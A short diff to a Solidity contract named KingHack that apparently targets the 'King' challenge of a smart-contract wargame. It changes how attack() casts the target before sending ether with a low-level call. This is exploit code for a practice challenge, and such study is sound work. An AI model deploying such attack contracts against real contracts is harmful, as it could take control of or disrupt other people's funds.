@@ -6,7 +6,7 @@ contract KingHack {
     
     function attack() public payable {
         // when calling this in Remix, specify 1 ether in the value field
-        (bool success, ) = ogContract.call{ value: msg.value, gas: 4000000 }("");
+        (bool success, ) = address(ogContract).call{ value: msg.value, gas: 4000000 }("");
         require(success, "Transfer failed.");
     }
     
